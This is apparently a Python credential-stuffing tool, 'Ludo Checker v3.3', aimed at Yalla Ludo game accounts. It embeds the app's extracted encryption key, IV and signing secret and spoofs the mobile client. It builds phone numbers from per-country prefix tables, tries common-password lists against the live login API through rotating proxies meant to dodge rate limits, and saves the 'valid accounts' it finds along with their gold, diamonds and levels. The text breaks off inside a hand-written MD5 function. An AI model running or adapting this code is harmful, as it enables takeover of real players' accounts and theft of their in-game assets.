# ═══════════════════════════════════════════════════════════════════
#  Ludo Checker v3.3 - Advanced Network Layer + Auto Installer
#  Developer: Mikel1d
#  Channel: https://t.me/Mikel224
# ═══════════════════════════════════════════════════════════════════

import subprocess
import sys
import os

# ═══════════════════════════════════════════════════════════════════
#  AUTO INSTALLER
# ═══════════════════════════════════════════════════════════════════

REQUIRED_PACKAGES = {
    "requests": "requests",
    "Crypto": "pycryptodome",
    "colorama": "colorama",
    "urllib3": "urllib3",
}


def _ensure_pip():
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "--version"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True
    except Exception:
        try:
            subprocess.check_call([sys.executable, "-m", "ensurepip", "--default-pip"])
            return True
        except Exception:
            return False


def _is_installed(import_name):
    try:
        __import__(import_name)
        return True
    except ImportError:
        return False


def _install_package(pkg_name):
    print(f"\033[1;33m[*] Installing {pkg_name} ...\033[0m")
    try:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "--upgrade", "--quiet", pkg_name
        ])
        print(f"\033[1;32m[+] {pkg_name} installed successfully.\033[0m")
        return True
    except subprocess.CalledProcessError:
        try:
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                "--user", "--upgrade", "--quiet", pkg_name
            ])
            print(f"\033[1;32m[+] {pkg_name} installed (user mode).\033[0m")
            return True
        except Exception as e:
            print(f"\033[1;31m[!] Failed to install {pkg_name}: {e}\033[0m")
            return False


def auto_install_dependencies():
    print("\033[1;36m╔══════════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║   Checking Required Libraries...             ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════════════╝\033[0m")
    missing = []
    for import_name, pip_name in REQUIRED_PACKAGES.items():
        if _is_installed(import_name):
            print(f"\033[1;32m[✓] {import_name:<10} already installed.\033[0m")
        else:
            print(f"\033[1;33m[!] {import_name:<10} missing.\033[0m")
            missing.append((import_name, pip_name))

    if not missing:
        print("\033[1;32m[+] All dependencies are ready!\033[0m\n")
        return True

    if not _ensure_pip():
        print("\033[1;31m[!] pip is not available. Please install it manually.\033[0m")
        return False

    for import_name, pip_name in missing:
        if not _install_package(pip_name):
            print(f"\033[1;31m[!] Cannot continue without {pip_name}\033[0m")
            return False

    import importlib
    import site
    importlib.reload(site)
    print("\033[1;32m[+] All dependencies installed successfully!\033[0m\n")
    return True


auto_install_dependencies()

# ═══════════════════════════════════════════════════════════════════
#  MAIN IMPORTS
# ═══════════════════════════════════════════════════════════════════

import base64
import json
import hashlib
import requests
import random
import threading
import time
import queue
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from urllib3.util.retry import Retry
import uuid
import struct
import hmac as hmacmod
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Dummy:
        pass
    Fore = Back = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Fore.CYAN = Fore.MAGENTA = ''
    Back.GREEN = Back.RED = Back.YELLOW = Back.WHITE = Back.BLACK = ''
    Style.BRIGHT = ''

BOLD = "\033[1m"
BLUE = "\033[1;34m"
PINK = "\033[1;35m"
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

version = '3.3'
b1key = b'4e82797b276c5cb729db62aaa229a057'
b1iv = b'0102030405060708'
secret = 'L3)qk*@8'
ua = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"

kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

XOR_KEY = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")

# ═══════════════════════════════════════════════════════════════════
#  ADVANCED NETWORK LAYER
# ═══════════════════════════════════════════════════════════════════

class NetworkConfig:
    POOL_CONNECTIONS = 20
    POOL_MAXSIZE = 50
    CONNECT_TIMEOUT = 4
    READ_TIMEOUT = 8
    MAX_RETRIES = 2
    BACKOFF_FACTOR = 0.3
    RETRY_STATUS = [429, 500, 502, 503, 504]
    PROXY_MAX_FAILS = 5
    PROXY_RATE_LIMIT = 30
    DOMAIN_CB_THRESHOLD = 8
    DOMAIN_CB_COOLDOWN = 15

_net_cfg = NetworkConfig()

_dns_cache = {}
_dns_lock = threading.Lock()
_dns_ttl = 300

_orig_getaddrinfo = socket.getaddrinfo

def _cached_getaddrinfo(host, *args, **kwargs):
    key = (host, args[:2] if len(args) >= 2 else ())
    now = time.time()
    with _dns_lock:
        if key in _dns_cache:
            result, expiry = _dns_cache[key]
            if now < expiry:
                return result
    result = _orig_getaddrinfo(host, *args, **kwargs)
    with _dns_lock:
        _dns_cache[key] = (result, now + _dns_ttl)
    return result

socket.getaddrinfo = _cached_getaddrinfo

_thread_local = threading.local()


def _build_session():
    s = requests.Session()
    s.headers.update({
        'User-Agent': ua,
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'X-Requested-With': 'XMLHttpRequest',
    })
    retry_cfg = Retry(
        total=_net_cfg.MAX_RETRIES,
        connect=_net_cfg.MAX_RETRIES,
        read=_net_cfg.MAX_RETRIES,
        status=_net_cfg.MAX_RETRIES,
        backoff_factor=_net_cfg.BACKOFF_FACTOR,
        status_forcelist=_net_cfg.RETRY_STATUS,
        allowed_methods=frozenset(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS']),
        raise_on_status=False,
        respect_retry_after_header=True,
    )
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=_net_cfg.POOL_CONNECTIONS,
        pool_maxsize=_net_cfg.POOL_MAXSIZE,
        max_retries=retry_cfg,
        pool_block=False,
    )
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    return s


def get_session():
    if not hasattr(_thread_local, 'session'):
        _thread_local.session = _build_session()
    return _thread_local.session


class CircuitBreaker:
    def __init__(self, threshold, cooldown):
        self.threshold = threshold
        self.cooldown = cooldown
        self.fails = defaultdict(int)
        self.opened_at = {}
        self._lock = threading.Lock()

    def allow(self, domain):
        with self._lock:
            if domain in self.opened_at:
                if time.time() - self.opened_at[domain] < self.cooldown:
                    return False
                del self.opened_at[domain]
                self.fails[domain] = 0
            return True

    def success(self, domain):
        with self._lock:
            self.fails[domain] = 0
            if domain in self.opened_at:
                del self.opened_at[domain]

    def failure(self, domain):
        with self._lock:
            self.fails[domain] += 1
            if self.fails[domain] >= self.threshold:
                self.opened_at[domain] = time.time()


_domain_cb = CircuitBreaker(_net_cfg.DOMAIN_CB_THRESHOLD, _net_cfg.DOMAIN_CB_COOLDOWN)


class ProxyManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.working = []
        self.dead = []
        self.idx = 0
        self.rate_window = defaultdict(lambda: [0.0, 0])

    def set_working(self, proxies):
        with self.lock:
            self.working = proxies
            self.idx = 0

    def get_next(self):
        with self.lock:
            if not self.working:
                return None
            n = len(self.working)
            now = time.time()
            for _ in range(n):
                rec = self.working[self.idx % n]
                self.idx += 1
                if not rec.get('working', True):
                    continue
                key = id(rec)
                win_start, count = self.rate_window[key]
                if now - win_start >= 1.0:
                    self.rate_window[key] = [now, 1]
                    return rec
                if count < _net_cfg.PROXY_RATE_LIMIT:
                    self.rate_window[key][1] = count + 1
                    return rec
            return self.working[self.idx % n] if self.working else None

    def mark_failed(self, rec):
        if rec is None:
            return
        with self.lock:
            rec['fail_count'] = rec.get('fail_count', 0) + 1
            if rec['fail_count'] >= _net_cfg.PROXY_MAX_FAILS and rec.get('working', True):
                rec['working'] = False
                if rec in self.working:
                    self.working.remove(rec)
                if rec not in self.dead:
                    self.dead.append(rec)

    def mark_success(self, rec):
        if rec is None:
            return
        with self.lock:
            rec['fail_count'] = max(0, rec.get('fail_count', 0) - 1)

    def stats(self):
        with self.lock:
            return len(self.working), len(self.dead)


_proxy_mgr = ProxyManager()

proxy_list = []
proxy_lock = threading.Lock()
working_proxies = []
dead_proxies = []

hits_list = []
telegram_queue = queue.Queue()

start_time = time.time()
levels_count = [0, 0, 0, 0, 0]
golds_count = [0, 0, 0, 0, 0, 0]
diamonds_count = [0, 0, 0, 0, 0, 0]

results = []
stats = defaultdict(int)
stats['sent_tel'] = 0
stats['failed_tel'] = 0
lock = threading.Lock()
stop_flag = False
MAX_RESULTS = 2000
valid_accounts_file = "A_valid_accounts.txt"

BOT_TOKEN = ""
CHAT_ID = ""

DOMAINS = [
    "httpgateway.carrstuv.com",
    "httpgateway.foodjkl.com",
    "httpgateway.planecde.com",
]

BASE_URL = "https://{domain}/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"

INFO_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
INFO_HOSTS = [
    "https://httpgateway.talkwxy.com",
    "https://httpgateway.yalla.games",
    "https://httpgateway.beachab.com",
]

countries_data = {
    "1": {"name": "Iraq", "code": "964", "countryCode": "IQ", "prefixes": ["0750", "0751", "0770", "0771", "0780", "0781", "0790", "0791"]},
    "2": {"name": "Saudi Arabia", "code": "966", "countryCode": "SA", "prefixes": ["050", "053", "054", "055", "056", "057", "058", "059"]},
    "3": {"name": "Egypt", "code": "20", "countryCode": "EG", "prefixes": ["010", "011", "012", "015"]},
    "4": {"name": "UAE", "code": "971", "countryCode": "AE", "prefixes": ["050", "052", "054", "055", "056", "058"]},
    "5": {"name": "Jordan", "code": "962", "countryCode": "JO", "prefixes": ["077", "078", "079"]},
    "6": {"name": "Lebanon", "code": "961", "countryCode": "LB", "prefixes": ["030", "031", "070", "071", "076", "078", "079"]},
    "7": {"name": "Syria", "code": "963", "countryCode": "SY", "prefixes": ["093", "094", "095", "096", "098", "099"]},
    "8": {"name": "Palestine", "code": "970", "countryCode": "PS", "prefixes": ["056", "059"]},
    "9": {"name": "Kuwait", "code": "965", "countryCode": "KW", "prefixes": ["500", "501", "502", "503", "505", "506", "507", "509", "550", "551", "552", "553", "554", "555", "556", "557", "558", "559"]},
    "10": {"name": "Qatar", "code": "974", "countryCode": "QA", "prefixes": ["300", "301", "302", "303", "304", "305", "306", "307", "308", "309", "330", "331", "332", "333", "334", "335", "336", "337", "338", "339", "550", "551", "552", "553", "554", "555", "556", "557", "558", "559", "660", "661", "662", "663", "664", "665", "666", "667", "668", "669", "700", "701", "702", "703", "704", "705", "706", "707", "708", "709"]},
    "11": {"name": "Bahrain", "code": "973", "countryCode": "BH", "prefixes": ["300", "301", "302", "303", "304", "305", "306", "307", "308", "309", "310", "311", "312", "313", "314", "315", "316", "317", "318", "319", "330", "331", "332", "333", "334", "335", "336", "337", "338", "339", "340", "341", "342", "343", "344", "345", "346", "347", "348", "349", "350", "351", "352", "353", "354", "355", "356", "357", "358", "359", "360", "361", "362", "363", "364", "365", "366", "367", "368", "369", "380", "381", "382", "383", "384", "385", "386", "387", "388", "389", "390", "391", "392", "393", "394", "395", "396", "397", "398", "399"]},
    "12": {"name": "Oman", "code": "968", "countryCode": "OM", "prefixes": ["700", "701", "702", "703", "704", "705", "706", "707", "708", "709", "710", "711", "712", "713", "714", "715", "716", "717", "718", "719", "720", "721", "722", "723", "724", "725", "726", "727", "728", "729", "900", "901", "902", "903", "904", "905", "906", "907", "908", "909", "910", "911", "912", "913", "914", "915", "916", "917", "918", "919", "920", "921", "922", "923", "924", "925", "926", "927", "928", "929"]},
    "13": {"name": "Yemen", "code": "967", "countryCode": "YE", "prefixes": ["700", "701", "702", "703", "704", "705", "706", "707", "708", "709", "710", "711", "712", "713", "714", "715", "716", "717", "718", "719", "730", "731", "732", "733", "734", "735", "736", "737", "738", "739", "770", "771", "772", "773", "774", "775", "776", "777", "778", "779"]},
    "14": {"name": "Morocco", "code": "212", "countryCode": "MA", "prefixes": ["060", "061", "062", "063", "064", "065", "066", "067", "068", "069", "070", "071", "072", "073", "074", "075", "076", "077", "078", "079"]},
    "15": {"name": "Algeria", "code": "213", "countryCode": "DZ", "prefixes": ["050", "051", "052", "053", "054", "055", "056", "057", "058", "059", "060", "061", "062", "063", "064", "065", "066", "067", "068", "069", "070", "071", "072", "073", "074", "075", "076", "077", "078", "079"]},
    "16": {"name": "Tunisia", "code": "216", "countryCode": "TN", "prefixes": ["200", "201", "202", "203", "204", "205", "206", "207", "208", "209", "500", "501", "502", "503", "504", "505", "506", "507", "508", "509", "900", "901", "902", "903", "904", "905", "906", "907", "908", "909"]},
    "17": {"name": "Libya", "code": "218", "countryCode": "LY", "prefixes": ["091", "092", "093", "094", "095", "096", "097", "098", "099"]},
    "18": {"name": "Sudan", "code": "249", "countryCode": "SD", "prefixes": ["090", "091", "092", "093", "094", "095", "096", "097", "098", "099", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109", "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122", "123", "124", "125", "126", "127", "128", "129"]},
    "19": {"name": "Somalia", "code": "252", "countryCode": "SO", "prefixes": ["060", "061", "062", "063", "064", "065", "066", "067", "068", "069", "070", "071", "072", "073", "074", "075", "076", "077", "078", "079", "090", "091", "092", "093", "094", "095", "096", "097", "098", "099"]},
    "20": {"name": "Djibouti", "code": "253", "countryCode": "DJ", "prefixes": ["770", "771", "772", "773", "774", "775", "776", "777", "778", "779"]},
    "21": {"name": "Mauritania", "code": "222", "countryCode": "MR", "prefixes": ["200", "201", "202", "203", "204", "205", "206", "207", "208", "209", "300", "301", "302", "303", "304", "305", "306", "307", "308", "309", "400", "401", "402", "403", "404", "405", "406", "407", "408", "409"]},
    "22": {"name": "Comoros", "code": "269", "countryCode": "KM", "prefixes": ["300", "301", "302", "303", "304", "305", "306", "307", "308", "309", "310", "311", "312", "313", "314", "315", "316", "317", "318", "319", "320", "321", "322", "323", "324", "325", "326", "327", "328", "329", "330", "331", "332", "333", "334", "335", "336", "337", "338", "339", "340", "341", "342", "343", "344", "345", "346", "347", "348", "349"]},
    "23": {"name": "India", "code": "91", "countryCode": "IN", "prefixes": ["6", "7", "8", "9"]},
    "24": {"name": "Pakistan", "code": "92", "countryCode": "PK", "prefixes": ["300", "301", "302", "303", "304", "305", "306", "307", "308", "309", "310", "311", "312", "313", "314", "315", "316", "317", "318", "319", "320", "321", "322", "323", "324", "325", "326", "327", "328", "329", "330", "331", "332", "333", "334", "335", "336", "337", "338", "339", "340", "341", "342", "343", "344", "345", "346", "347", "348", "349"]},
    "25": {"name": "Bangladesh", "code": "880", "countryCode": "BD", "prefixes": ["13", "14", "15", "16", "17", "18", "19"]},
    "26": {"name": "Indonesia", "code": "62", "countryCode": "ID", "prefixes": ["811", "812", "813", "814", "815", "816", "817", "818", "819", "821", "822", "823", "831", "832", "833", "838", "851", "852", "853", "855", "856", "857", "858", "859", "877", "878", "879", "881", "882", "883", "884", "885", "886", "887", "888", "889", "896", "897", "898", "899"]},
    "27": {"name": "Nepal", "code": "977", "countryCode": "NP", "prefixes": ["98", "97", "96"]},
    "28": {"name": "Sri Lanka", "code": "94", "countryCode": "LK", "prefixes": ["70", "71", "72", "74", "75", "76", "77", "78"]},
}

PAYLOAD = {
    "mobile": "",
    "areaCode": "966",
    "password": "",
    "languageId": 2,
    "nationalityId": "1",
    "hostConfig": [
        {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.yalla.games", "type": 2, "version": 4},
        {"bizType": 5001, "countryCode": "", "hostUrl": "ws://firebreak.yalla.games", "type": 1, "version": 1},
        {"bizType": 5002, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5003, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5004, "countryCode": "IQ", "hostUrl": "https://httpgateway.penabcd.com", "type": 2, "version": 6},
        {"bizType": 5005, "countryCode": "IQ", "hostUrl": "https://api.lightkvd.com", "type": 2, "version": 4},
        {"bizType": 5006, "countryCode": "IQ", "hostUrl": "https://upload-as0.qiniup.com", "type": 2, "version": 5},
        {"bizType": 5007, "countryCode": "", "hostUrl": "https://www.yallapay.live,https://www.payfun.live,https://pre-www.yallapay.live,https://activity.funcdeg.com,https://activity.carrstuv.com", "type": 1, "version": 11},
        {"bizType": 2001, "countryCode": "", "hostUrl": "https://roomapi.yalla.games,https://roomapi.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2002, "countryCode": "", "hostUrl": "https://roomclog.yalla.games,https://roomclog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2003, "countryCode": "", "hostUrl": "https://roommoment.yalla.games,https://roommoment.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2004, "countryCode": "", "hostUrl": "https://www.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2005, "countryCode": "", "hostUrl": "https://file.yalla.Live", "type": 1, "version": 0},
        {"bizType": 2006, "countryCode": "IQ", "hostUrl": "https://nitrogen.foodjkl.com,https://nitrogen.yalla.games,https://nitrogen.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 2007, "countryCode": "IQ", "hostUrl": "wss://room.foodjkl.com,wss://room.yalla.games,wss://room.carrstuv.com", "type": 2, "version": 22},
        {"bizType": 2008, "countryCode": "IQ", "hostUrl": "wss://roomgame.yalla.games,wss://roomgame.foodjkl.com,wss://roomgame.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 4000, "countryCode": "IQ", "hostUrl": "ws://ludo01.carrstuv.com,wss://new-ludo.carrstuv.com", "type": 2, "version": 84},
        {"bizType": 4001, "countryCode": "IQ", "hostUrl": "ws://domino01.carrstuv.com,wss://new-domino.carrstuv.com", "type": 2, "version": 83},
        {"bizType": 4003, "countryCode": "IQ", "hostUrl": "wss://duelludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 4004, "countryCode": "IQ", "hostUrl": "wss://jungleludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 1001, "countryCode": "IQ", "hostUrl": "https://pay.foodjkl.com,https://pay.yalla.games,https://pay.carrstuv.com", "type": 2, "version": 17},
        {"bizType": 1002, "countryCode": "IQ", "hostUrl": "https://mail.foodjkl.com,https://mail.yalla.games,https://mail.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 1003, "countryCode": "IQ", "hostUrl": "https://clog.foodjkl.com,https://clog.carrstuv.com,https://clog.yalla.games", "type": 2, "version": 17},
        {"bizType": 1004, "countryCode": "IQ", "hostUrl": "https://activity.carrstuv.com,https://activity.yalla.games,https://activity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1005, "countryCode": "IQ", "hostUrl": "https://usuallyactivity.carrstuv.com,https://usuallyactivity.yalla.games,https://usuallyactivity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1007, "countryCode": "IQ", "hostUrl": "wss://tyr.foodjkl.com,wss://tyr.carrstuv.com,wss://tyr.yalla.games", "type": 2, "version": 18},
        {"bizType": 1008, "countryCode": "IQ", "hostUrl": "wss://hall.carrstuv.com,wss://hall.foodjkl.com,wss://hall.yallaludo.com", "type": 2, "version": 38},
        {"bizType": 6000, "countryCode": "", "hostUrl": "https://broadcast-host.ylconfig.com", "type": 1, "version": 0},
        {"bizType": 3000, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 3001, "countryCode": "IQ", "hostUrl": "https://dtchat.yalla.games,https://dtchat.carrstuv.com,https://dtchat.foodjkl.com", "type": 2, "version": 18},
        {"bizType": 3002, "countryCode": "IQ", "hostUrl": "https://activity.foodjkl.com,https://activity.carrstuv.com,https://activity.yalla.games", "type": 2, "version": 17},
        {"bizType": 3003, "countryCode": "IQ", "hostUrl": "https://dtslave.foodjkl.com,https://dtslave.yalla.games,https://dtslave.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 3004, "countryCode": "IQ", "hostUrl": "wss://dtslave.yalla.games,wss://dtslave.carrstuv.com,wss://dtslave.foodjkl.com", "type": 2, "version": 17}
    ],
    "simCountry": "SA",
    "version": "1.5.1.0",
    "deviceId": "",
    "deviceName": "realme RMX3085",
    "deviceType": 2,
    "downloadChannelId": 1,
    "shuMengId": "",
    "nonce": "",
    "plateType": 0,
    "phoneModel": "RMX3085",
    "X-Phone-Country": "SA",
    "X-Sim-Country": "SA",
    "AndroidId": "",
    "IsSubpackages": 0,
    "appType": 0,
}

DEFAULT_PASSWORDS = [
    'Aa123456',
    'As123456',
    'Aa123123',
    'Aa1234567890',
    'Aa112233',
    'Aa1234567',
    'Aa12345678',
    'Aa123456789',
]

IRAQ_PASSWORDS = [
    "1234", "12345", "123456", "1234567", "12345678",
    "123456789", "1234567890", "123456789123456789",
    "000000", "111111", "1122", "1212", "1221", "123123",
    "123321", "12344321", "11223344",
    "password", "qwerty", "abc123", "abcde12345",
    "admin123", "facebook", "pubgmobile", "pubg123",
    "aa11bb22", "aa11bb22cc33", "112233aabbcc",
    "Aa123456", "Aa1234567", "Aa12345678", "Aa123456789",
    "Aa1234567890", "Aa123123", "Aa112233",
    "qwer1234", "zxcv1234", "1234qwer",
    "1q2w3e4r", "qwer1111", "qwer0000",
    "1986", "1987", "1988", "1989",
    "1990", "1991", "1992",
]

PASSWORDS = []

Logo = f"""
{BOLD}{PINK}╔══════════════════════════════════════════════════════════════╗{RESET}
{BOLD}{PINK}║{RESET}                                                              {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}      {BOLD}{RED}███╗   ███╗██╗██╗  ██╗███████╗██╗{RESET}                    {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}      {BOLD}{RED}████╗ ████║██║██║ ██╔╝██╔════╝██║{RESET}                    {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}      {BOLD}{PINK}██╔████╔██║██║█████╔╝ █████╗  ██║{RESET}                    {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}      {BOLD}{PINK}██║╚██╔╝██║██║██╔═██╗ ██╔══╝  ██║{RESET}                    {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}      {BOLD}{CYAN}██║ ╚═╝ ██║██║██║  ██╗███████╗███████╗{RESET}               {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}      {BOLD}{CYAN}╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝{RESET}               {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}                                                              {BOLD}{PINK}║{RESET}
{BOLD}{PINK}╠══════════════════════════════════════════════════════════════╣{RESET}
{BOLD}{PINK}║{RESET}  {BOLD}{RED}◤{RESET} {BOLD}{YELLOW}L U D O   C H E C K E R{RESET}  {BOLD}{RED}◢{RESET}   {BOLD}{CYAN}»  V{RED}/{PINK}{version}{RESET}              {BOLD}{PINK}║{RESET}
{BOLD}{PINK}╠══════════════════════════════════════════════════════════════╣{RESET}
{BOLD}{PINK}║{RESET}  {BOLD}{GREEN}●{RESET} {BOLD}{WHITE}DEVELOPER{RESET}  {BOLD}{PINK}│{RESET}  {BOLD}{PINK}Mikel1d{RESET}                             {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}  {BOLD}{GREEN}●{RESET} {BOLD}{WHITE}STATUS   {RESET}  {BOLD}{PINK}│{RESET}  {BOLD}{GREEN}Premium Edition{RESET}                     {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}  {BOLD}{GREEN}●{RESET} {BOLD}{WHITE}VERSION  {RESET}  {BOLD}{PINK}│{RESET}  {BOLD}{YELLOW}v{version}{RESET}                              {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}  {BOLD}{GREEN}●{RESET} {BOLD}{WHITE}CHANNEL  {RESET}  {BOLD}{PINK}│{RESET}  {BOLD}{BLUE}https://t.me/Mikel224{RESET}             {BOLD}{PINK}║{RESET}
{BOLD}{PINK}╠══════════════════════════════════════════════════════════════╣{RESET}
{BOLD}{PINK}║{RESET}       {BOLD}{RED}★{RESET}  {BOLD}{YELLOW}LORD GOD — MIKEL{RESET}  {BOLD}{RED}★{RESET}                        {BOLD}{PINK}║{RESET}
{BOLD}{PINK}║{RESET}       {BOLD}{CYAN}@Mikel1d  {RED}+  {CYAN}https://t.me/Mikel224{RESET}             {BOLD}{PINK}║{RESET}
{BOLD}{PINK}╚══════════════════════════════════════════════════════════════╝{RESET}
{BOLD}{PINK}        {RED}⚡{RESET}  {BOLD}{GREEN}Advanced Network Engine v{version}{RESET}  {RED}⚡{RESET}
"""


def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    try:
        if '@' in line:
            auth_part, host_part = line.split('@', 1)
            if ':' in auth_part and ':' in host_part:
                user, pwd = auth_part.split(':', 1)
                host, port = host_part.rsplit(':', 1)
                port = int(port)
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                return {'http': proxy_url, 'https': proxy_url}
        parts = line.split(':')
        if len(parts) == 4:
            host, port, user, pwd = parts
            port = int(port)
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        if len(parts) == 1 and '.' in line and '/' not in line and not line.startswith('http'):
            if any(c.isalpha() for c in line):
                proxy_url = f"socks5://{line}"
                return {'http': proxy_url, 'https': proxy_url}
        if len(parts) == 2:
            host, port = parts
            port = int(port)
            proxy_url = f"http://{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        if line.startswith('http://') or line.startswith('https://') or line.startswith('socks5://'):
            return {'http': line, 'https': line}
    except (ValueError, IndexError):
        return None
    return None


def load_proxies_from_file(filepath):
    global proxy_list
    if not os.path.exists(filepath):
        print(f"{BOLD}{RED}[!] {PINK}File not found: {filepath}{RESET}")
        return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        proxy_list = []
        for line in lines:
            proxy_dict = parse_proxy_line(line)
            if proxy_dict:
                proxy_list.append({
                    'proxy': proxy_dict,
                    'original': line.strip(),
                    'working': True,
                    'fail_count': 0
                })
        if proxy_list:
            print(f"{BOLD}{GREEN}[+] {PINK}Loaded {YELLOW}{len(proxy_list)}{RESET} {BOLD}{PINK}proxies from file{RESET}")
            return True
        else:
            print(f"{BOLD}{RED}[!] {PINK}No valid proxies found in file{RESET}")
            return False
    except Exception as e:
        print(f"{BOLD}{RED}[!] {PINK}Error loading proxies: {e}{RESET}")
        return False


def test_proxy(proxy_dict):
    for url in ("https://httpbin.org/ip", "https://api.ipify.org?format=json"):
        try:
            r = requests.get(url, proxies=proxy_dict['proxy'], timeout=(5, 10))
            if r.status_code == 200:
                return True
        except Exception:
            pass
    return False


def check_all_proxies():
    global working_proxies, dead_proxies
    working_proxies = []
    dead_proxies = []
    print(f"\n{BOLD}{PINK}═══ {RED}Checking Proxies {PINK}═══{RESET}\n")
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(test_proxy, p): p for p in proxy_list}
        for future in as_completed(futures):
            proxy_data = futures[future]
            try:
                is_working = future.result()
                if is_working:
                    working_proxies.append(proxy_data)
                    print(f"{BOLD}{GREEN}[✓]{RESET} {BOLD}{PINK}{proxy_data['original']}{RESET} {BOLD}{GREEN}- Working{RESET}")
                else:
                    dead_proxies.append(proxy_data)
                    proxy_data['working'] = False
                    print(f"{BOLD}{RED}[✗]{RESET} {BOLD}{PINK}{proxy_data['original']}{RESET} {BOLD}{RED}- Dead{RESET}")
            except Exception:
                dead_proxies.append(proxy_data)
                proxy_data['working'] = False
    print(f"\n{BOLD}{GREEN}[+] {PINK}Working proxies: {YELLOW}{len(working_proxies)}{RESET} {BOLD}{PINK}/ {YELLOW}{len(proxy_list)}{RESET}")
    print(f"{BOLD}{RED}[+] {PINK}Dead proxies: {YELLOW}{len(dead_proxies)}{RESET}")

    _proxy_mgr.set_working(working_proxies)

    if len(working_proxies) == 0:
        print(f"\n{BOLD}{RED}[!] {PINK}No working proxies found!{RESET}")
        print(f"{BOLD}{YELLOW}[?] {PINK}Do you want to continue without proxies? (y/n):{RESET} ", end='')
        choice = input().strip().lower()
        if choice == 'y':
            return False
        else:
            sys.exit(0)
    return True


def get_next_proxy_data():
    return _proxy_mgr.get_next()


def get_next_proxy():
    rec = _proxy_mgr.get_next()
    return rec['proxy'] if rec else None


def mark_proxy_failed(rec):
    _proxy_mgr.mark_failed(rec)


def mark_proxy_success(rec):
    _proxy_mgr.mark_success(rec)


def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if i < 16:
                f = (b & c) | (~b & d)
                g = i
            elif i < 32:
                f = (d & b) | (~d & c)
                g = (5*i+1) % 16
            elif i < 48:
                f = b ^ c ^ d
                g = (3*i+5) % 16
            else:
                f = c ^ (b | ~d)
                g = (7*i) % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d
            d = c
            c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0 = (a0 + a) & 0xffffffff
